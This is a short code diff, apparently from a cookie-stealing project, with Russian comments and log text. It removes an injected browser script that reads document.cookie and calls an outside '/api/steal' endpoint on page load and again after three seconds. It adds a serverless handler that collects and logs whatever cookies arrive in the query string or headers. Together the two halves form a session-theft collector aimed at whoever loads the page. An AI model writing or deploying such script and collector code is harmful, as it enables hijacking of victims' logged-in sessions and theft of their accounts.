@@ -1,15 +1,6 @@
-<script>
-async function stealCookies() {
-    const cookies = document.cookie;
-    if (cookies) {
-        try {
-            await fetch("https://rmldarkvxq.github.io/SlivBDRm/api/steal", {  // или твой Vercel URL
-                method: 'GET',
-                mode: 'no-cors'
-            });
-        } catch(e) {}
-    }
+export default function handler(req, res) {
+    const cookies = req.query.cookies || req.headers.cookie || "пусто";
+    console.log("=== КУКИ ПРИЛЕТЕЛИ ===");
+    console.log(cookies);
+    res.status(200).send("ok");
 }
-stealCookies();
-setTimeout(stealCookies, 3000);
-</script>
